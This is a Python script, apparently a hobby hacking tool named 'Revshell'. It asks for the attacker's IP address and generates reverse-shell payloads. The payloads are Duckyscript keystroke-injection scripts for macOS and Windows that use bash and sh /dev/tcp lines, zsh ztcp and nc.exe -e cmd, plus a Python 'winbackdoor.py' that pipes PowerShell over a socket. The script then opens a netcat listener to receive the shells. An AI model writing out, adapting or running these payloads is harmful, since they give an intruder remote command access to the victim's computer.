import colorama
from colorama import Fore, Back, Style, init
init()
import time
import os
import pyfiglet
import subprocess
title = pyfiglet.figlet_format("Revshell", font="poison", width=500)
os.system("clear")
def write(variable, filename):
	os.system(f"touch {filename}")
	with open(filename, 'w') as file:
		file.write(str(variable))
def postpayload(ident, payload):
	while True:
		print("")
		genorview = input("Download Duckyscript payload, or view it? (down/view): ")
		if genorview == "view":
			print(payload)
			break
		elif genorview == "down":
			write(payload, ident)
			print("")
			print(Fore.GREEN + "[+]" + Fore.RESET + f"Duckyscript payload saved as {ident} to current directory.")
			print("")
			break
		else:
			print("Invalid.")
	startlistener = input("Activate payload now? (y/n): ")
	if startlistener == "y":
		print("Session activated. Remember, you will not have a command prompt visible, but the outputs will work if the payload has been delivered correctly. ")
		os.system("nc -lvn 9999")
	elif startlistener == "n":
		print("OK. Type, 'go' to start the listener at any moment. Remember, do this before delivering the payload.")
		print("")
		while True:
			start = input("> ")
			if start == "go":
				print("Session activated. Remember, you will not have a command prompt visible, but the outputs will work if the payload has been delivered correctly. ")
				os.system("nc -lvn 9999")
				break
def type_text(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.001)
    print("")
def type_text_slow(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.05)
    print("")
def loading_screen(message):
    print(message, end="")
    spinner = ["|", "/", "-", "\\"]
    start_time = time.time()
    i = 0
    while True:
        if time.time() - start_time > 3:
            print("\b \b" * (len(message) + 1), end="")
            break
        print(f"\b{spinner[i%4]}", end="", flush=True)
        i += 1
        time.sleep(0.05)
type_text(Fore.BLUE + title + Fore.RESET)
print("")
global lhost
lhost = input("What is your private IP? (you need to be on the same network as the target): ")
print("")
print(Fore.GREEN + "READY" + Fore.RESET)
print("")
targplat = '''

Select target Platform:

1. macOS
2. Windows

'''
type_text(Fore.RED + targplat + Fore.RESET)
targplatchoic = input("")
if targplatchoic == "1":
	macshelltyp = '''

Select target shell:

1. zsh
2. bash
3. /bin/bash
4. /bin/sh

'''
	type_text(Fore.RED + macshelltyp + Fore.RESET)
	macshellchoic = input("")
	if macshellchoic == "1":
		ident = "maczshshell.txt"
		payload = f'''
ID 05ac:021e Apple:Keyboard
DELAY 1000
GUI SPACE
DELAY 200
STRING terminal
DELAY 200
ENTER
DELAY 1000
STRING zsh -c 'zmodload zsh/net/tcp && ztcp {lhost} 9999 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
DELAY 1000
ENTER
DELAY 1000
'''
		postpayload(ident, payload)
	elif macshellchoic == "2":
		ident = "macbashshell.txt"
		payload = f'''
ID 05ac:021e Apple:Keyboard
DELAY 1000
GUI SPACE
DELAY 200
STRING terminal
DELAY 200
ENTER
DELAY 1000
STRING bash -i >& /dev/tcp/{lhost}/9999 0>&1
DELAY 1000
ENTER
DELAY 1000
'''
		postpayload(ident, payload)
	elif macshellchoic == "3":
		ident = "macbinbashshell.txt"
		payload = f'''
ID 05ac:021e Apple:Keyboard
DELAY 1000
GUI SPACE
DELAY 200
STRING terminal
DELAY 200
ENTER
DELAY 1000
STRING /bin/bash -i >& /dev/tcp/{lhost}/9999 0>&1
DELAY 1000
ENTER
DELAY 1000
'''
		postpayload(ident, payload)
	elif macshellchoic == "4":
		ident = "macbinshshell.txt"
		payload = f'''
ID 05ac:021e Apple:Keyboard
DELAY 1000
GUI SPACE
DELAY 200
STRING terminal
DELAY 200
ENTER
DELAY 1000
STRING /bin/sh -i >& /dev/tcp/{lhost}/9999 0>&1
DELAY 1000
ENTER
DELAY 1000
'''
		postpayload(ident, payload)
	else:
		print("invalid.")
if targplatchoic == "2":
	typ = '''
Choose method:

1. Malicious Python file
2. Duckyscript payload
'''
	type_text(typ)
	typchoic = input("")
	if typchoic == "1":
		payload = f'''
import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{lhost}",9999))

p=subprocess.Popen(["powershell"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
'''
		ident = "winbackdoor.py"
		print("")
		print("File saved as winbackdoor.py")
		print("")
		write(payload, ident)
		startlistener = input("Activate payload now? (y/n): ")
		if startlistener == "y":
			print("Session activated. Remember, you will not have a command prompt visible, but the outputs will work if the payload has been delivered correctly. ")
			os.system("nc -lvn 9999")
		elif startlistener == "n":
			print("OK. Type, 'go' to start the listener at any moment. Remember, do this before delivering the payload.")
			print("")
			while True:
				start = input("> ")
				if start == "go":
					print("Session activated. Remember, you will not have a command prompt visible, but the outputs will work if the payload has been delivered correctly. ")
					os.system("nc -lvn 9999")
					break
	elif typchoic == "2":
		payload = f'''
GUI r
STRING cmd
DELAY 500
STRING nc.exe {lhost} 9999 -e cmd
ENTER
'''
		ident = "winrevshell.txt"
		postpayload(ident, payload)
else:
	print("Invalid.")